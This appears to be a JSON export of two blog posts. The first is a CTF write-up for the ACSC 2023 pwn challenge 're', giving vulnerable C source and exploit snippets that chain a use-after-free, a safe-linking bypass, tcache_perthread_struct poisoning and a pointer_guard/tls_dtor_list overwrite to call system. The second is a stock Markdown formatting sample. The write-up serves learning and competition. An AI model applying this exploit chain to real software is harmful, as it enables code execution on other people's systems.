[{"content":"[pwn 300] re authored by shift-crops\nSometimes you want to rewrite notes.\nGiven files:\nI didn\u0026rsquo;t manage to solve this challenge during contest but I\u0026rsquo;ve learnt a lot of new things including recently protection on heap (safe linking) and on pointer (pointer guard), the existence of tcache_perthread_struct, tls_dtor_list, and some other interesting tricks. I also did some set up to read glibc source code seriously. Therefore, I wanted to write a detail writeup.\nUnderstand the binary Let\u0026rsquo;s take a look at the source code given:\nre.c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; static int getnline(char *buf, int size); static int getint(void); static void edit(void); struct Memo { size_t size; char* buf; } mlist[10]; __attribute__((constructor)) static int init(){ alarm(30); setbuf(stdin, NULL); setbuf(stdout, NULL); return 0; } int main(void){ for(;;){ printf(\u0026#34;\\nMENU\\n\u0026#34; \u0026#34;1. Edit\\n\u0026#34; \u0026#34;2. List\\n\u0026#34; \u0026#34;0. Exit\\n\u0026#34; \u0026#34;\u0026gt; \u0026#34;); switch(getint()){ case 0: goto end; case 1: edit(); break; case 2: for(int i=0; i\u0026lt;sizeof(mlist)/sizeof(struct Memo); i++) if(mlist[i].size \u0026gt; 0 \u0026amp;\u0026amp; mlist[i].buf) printf(\u0026#34;[%d] %.*s\\n\u0026#34;, i, (int)mlist[i].size, mlist[i].buf); break; } } end: puts(\u0026#34;Bye.\u0026#34;); return 0; } static void edit(void){ unsigned idx, size; printf(\u0026#34;Index: \u0026#34;); if((idx = getint()) \u0026gt;= sizeof(mlist)/sizeof(struct Memo)){ puts(\u0026#34;Out of list\u0026#34;); return; } printf(\u0026#34;Size: \u0026#34;); if((size = getint()) \u0026gt; 0x78){ puts(\u0026#34;Too big memo\u0026#34;); return; } char *p = realloc(mlist[idx].buf, size); if(size \u0026gt; mlist[idx].size)\t// size and idx can be 0 mlist[idx].buf = p; mlist[idx].size = size; printf(\u0026#34;Memo: \u0026#34;); getnline(mlist[idx].buf, size); puts(\u0026#34;Done\u0026#34;); } static int getnline(char *buf, int size){ int len; if(size \u0026lt;= 0 || (len = read(STDIN_FILENO, buf, size-1)) \u0026lt;= 0) return -1; if(buf[len-1]==\u0026#39;\\n\u0026#39;) len--; buf[len] = \u0026#39;\\0\u0026#39;; return len; } static int getint(void){ char buf[0x10] = {}; getnline(buf, sizeof(buf)); return atoi(buf); } It\u0026rsquo;s a typical note challenge structure. We have an array of 10 notes of size 0-0x78. We can edit or show note\u0026rsquo;s content. edit() is more noticable that implemented using realloc(), and input size can be 0 so we free() chunk, but pointer is not cleared after free(). So in summary we can use edit() to:\nAllocate new chunk for empty note Allocate new bigger chunk for smaller note. Edit note\u0026rsquo;s content Free chunk, with pointer remained Leak heap base We can abuse the above finding to leak heap base by freeing a chunk that another idx point to.\n1 2 3 4 5 6 # leak heap base edit(0, 0x60, b\u0026#39;a\u0026#39;) edit(0, 0) edit(1, 0x60, b\u0026#39;a\u0026#39;) edit(0, 0) list() Glibc-2.32\u0026rsquo;s Safe Linking https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/\nNote that what we leaked is an encrypted form of chunk\u0026rsquo;s fd:\ngdb This is because of glibc-2.32\u0026rsquo;s safe linking.\nSafe linking is a security mechanism to protect malloc()\u0026rsquo;s single-linked lists from tampering by attacker.\nIn this case we encounter this protection when allocate and free tcache chunk\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 /* Caller must ensure that we know tc_idx is valid and there\u0026#39;s room for more chunks. */ static __always_inline void tcache_put (mchunkptr chunk, size_t tc_idx) { tcache_entry *e = (tcache_entry *) chunk2mem (chunk); /* Mark this chunk as \u0026#34;in the tcache\u0026#34; so the test in _int_free will detect a double free. */ e-\u0026gt;key = tcache_key; e-\u0026gt;next = PROTECT_PTR (\u0026amp;e-\u0026gt;next, tcache-\u0026gt;entries[tc_idx]); tcache-\u0026gt;entries[tc_idx] = e; ++(tcache-\u0026gt;counts[tc_idx]); } /* Caller must ensure that we know tc_idx is valid and there\u0026#39;s available chunks to remove. */ static __always_inline void * tcache_get (size_t tc_idx) { tcache_entry *e = tcache-\u0026gt;entries[tc_idx]; if (__glibc_unlikely (!aligned_OK (e))) malloc_printerr (\u0026#34;malloc(): unaligned tcache chunk detected\u0026#34;); tcache-\u0026gt;entries[tc_idx] = REVEAL_PTR (e-\u0026gt;next); --(tcache-\u0026gt;counts[tc_idx]); e-\u0026gt;key = 0; return (void *) e; } Compare with glibc-2.31\u0026rsquo;s malloc, we notice that tcache chunk\u0026rsquo;s fd is encrypted and decrypted with PROTECT_PTR() and REVEAL_PTR()\n1 2 3 #define PROTECT_PTR(pos, ptr) \\ ((__typeof (ptr)) ((((size_t) pos) \u0026gt;\u0026gt; 12) ^ ((size_t) ptr))) #define REVEAL_PTR(ptr) PROTECT_PTR (\u0026amp;ptr, ptr) For example:\nInstead of storing tcache-\u0026gt;entries[tc_idx], tcache_put() store\n(\u0026amp;e-\u0026gt;next\u0026gt;\u0026gt;12)^(tcache-\u0026gt;entries[tc_idx]) \u0026amp;e-\u0026gt;next\u0026gt;\u0026gt;12 is basically heap base, and tcache-\u0026gt;entries[tc_idx] is equal to zero when the bin is empty (the first time a chunk is inserted into that bin).\nSo the expression is equal to heap_base\u0026gt;\u0026gt;12.\nLeak libc base and control tcache_perthread_struct Now we have heap address.\nMy first attempt during ctf is trying to insert a big chunk to unsorted bin and leak libc base. But even when I do the former, it used up 9 slot of notes and I couldn\u0026rsquo;t perform another tcache poisoning to point to the big chunk and leak libc base.\nAfter reading nyancat\u0026rsquo;s writeup, I notice the existence of tcache_perthread_struct which is the first chunk to be allocated on heap. If we could control the tcache struct, we could perform a lot of magic.\nFirst prepare tcache poisoning for 2 bins to allocate at tcache_perthread_struct. Note that we overwrite fd with PROTECT_PTR(tcache_perthead_struct) instead of the original pointer.\n1 2 3 4 5 6 7 8 9 10 # tcache poisoning to alloc 2 chunks at tcache_perthead_struct edit(0, 0x60, p64(0)*2) edit(0, 0) edit(0, 0x60, p64(protect(heap_base+0x10))) edit(2, 0x70, p64(0)*2) edit(2, 0) edit(2, 0x70, p64(0)*2) edit(2, 0) edit(2, 0x70, p64(protect(heap_base+0x10))) Then write 0x290 bin size to 7, free it to put it to unsorted bin (fastbin\u0026rsquo;s max bin size is 0xa0) and leak libc base.\n1 2 3 4 5 6 edit(3, 0x60, p64(0)) edit(4, 0x60, p64(0) + p64(0x200000000)) edit(5, 0x70, p64(0)) edit(6, 0x70, p16(0)*0x27 + p16(7)) edit(4, 0) list() tls_dtor_list From glibc-2.32, __malloc_hook and __free_hook were removed so I used tls_dtor_list to prepare a function call when program exit().\nexit() is actually a wrapper of __run_exit_handlers(). That function will call __call_tls_dtors() if tls_dtor_list is not NULL.\n1 2 3 4 5 6 7 8 9 10 11 __run_exit_handlers (int status, struct exit_function_list **listp, bool run_list_atexit, bool run_dtors) { /* First, call the TLS destructors. */ #ifndef SHARED if (\u0026amp;__call_tls_dtors != NULL) #endif if (run_dtors) __call_tls_dtors (); //[truncated...] } tls_dtor_list\u0026rsquo;s address can be calculated from libc base. We can prepare the pointer in tcache struct to arbitrarily and point it to a prepared dtor_list.\nPointer mangling There\u0026rsquo;s one thing to overcome that function pointer in __call_tls_dtors() is passed to PTR_DEMANGLE() before being called.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 /* Call the destructors. This is called either when a thread returns from the initial function or when the process exits via the exit function. */ void __call_tls_dtors (void) { while (tls_dtor_list) { struct dtor_list *cur = tls_dtor_list; dtor_func func = cur-\u0026gt;func; #ifdef PTR_DEMANGLE PTR_DEMANGLE (func); #endif tls_dtor_list = tls_dtor_list-\u0026gt;next; func (cur-\u0026gt;obj); /* Ensure that the MAP dereference happens before l_tls_dtor_count decrement. That way, we protect this access from a potential DSO unload in _dl_close_worker, which happens when l_tls_dtor_count is 0. See CONCURRENCY NOTES for more detail. */ atomic_fetch_add_release (\u0026amp;cur-\u0026gt;map-\u0026gt;l_tls_dtor_count, -1); free (cur); } } PTR_MANGLE() works by XORing the pointer with a 64bit secret thread data (fs:0x30), then performing a bitwise left rotation of 0x11 bits (on x86-64). PTR_DEMANGLE() is the reverse.\nThat secret value is store in Thread Local Storage (namely pointer_guard, below canary) and its address can be calculated from libc base too. If you can overwrite the pointer guard value to 0, so the mangle will be just ROL(0x11)\nTherefore, we control tcache_perthread_struct to point entries of 2 sizes to tls_dtor_list and pointer_guard to bypass PTR_DEMANGLE() and point tls_dtor_list to a crafted dtor_list with function attribute can be system or execve\n1 2 3 4 5 edit(0, 0x78, p16(1)*(0x70//2)) # overwrite tcache-\u0026gt;counts edit(1, 0x78, p64(tls_dtor_list) + p64(pointer_guard) + p64(rol(lib.sym[\u0026#39;system\u0026#39;], 0x11, 64)) + p64(binsh)) # overwrite tcache-\u0026gt;entries edit(7, 0x20, p64(0)) # overwrite pointer_guard edit(8, 0x18, p64(0) + p64(fake_dtor_list)) # point to fake dtor_list ","description":"","id":2,"section":"posts","tags":["pwn"],"title":"ACSC 2023 writeup (re)","uri":"sulaidat.github.io/blog/en/posts/2023-44-28-acsc2023/"},{"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings The following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution Tiam, ad mint andaepu dandae nostion secatur sequo quae.\nNote that you can use Markdown syntax within a blockquote.\nBlockquote with attribution Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.\n— Rob Pike1\nTables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\nName Age Bob 27 Alice 23 Inline Markdown within tables Inline Markdown In Table italics bold strikethrough code Code Blocks Code block with backticks html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block with Hugo\u0026rsquo;s internal highlight shortcode 1 2 3 4 5 6 7 8 9 10 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; List Types Ordered List First item Second item Third item Unordered List List item Another item And another item Nested list Item First Sub-item Second Sub-item Other Elements — abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn: Zn\nPress CTRL+ALT+Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\nThe above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","description":"Sample article showcasing basic Markdown syntax and formatting for HTML elements.","id":3,"section":"posts","tags":["markdown","css","html","themes"],"title":"Markdown Syntax Guide","uri":"sulaidat.github.io/blog/en/posts/markdown-syntax/"}]